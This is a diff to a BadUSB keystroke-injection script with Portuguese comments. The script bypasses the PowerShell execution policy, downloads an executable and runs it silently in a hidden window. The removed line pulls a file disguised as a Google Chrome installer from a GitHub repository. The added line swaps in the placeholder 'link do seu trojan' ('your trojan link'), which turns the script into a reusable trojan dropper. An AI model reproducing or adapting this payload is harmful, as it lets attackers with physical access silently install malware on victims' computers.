@@ -14,7 +14,7 @@ STRING Set-ExecutionPolicy Bypass -Scope Process -Force
 ENTER
 DELAY 2000
 REM Realiza o Download e a execução do arquivo
-STRING (New-Object System.Net.WebClient).DownloadFile("https://github.com/Bxy777/digispark/raw/main/Google%20chrome%20(2).exe", "$($env:LOCALAPPDATA)\Google_Chrome.exe"); Start-Process -FilePath "$($env:LOCALAPPDATA)\Google_Chrome.exe" -ArgumentList "/S" -WindowStyle Hidden
+STRING (New-Object System.Net.WebClient).DownloadFile("link do seu trojan", "$($env:LOCALAPPDATA)\nome do arquivo que vai abrir"); Start-Process -FilePath "$($env:LOCALAPPDATA)\nome do arquivo que vai abrir" -ArgumentList "/S" -WindowStyle Hidden
 ENTER
 DELAY 7000
 STRING exit
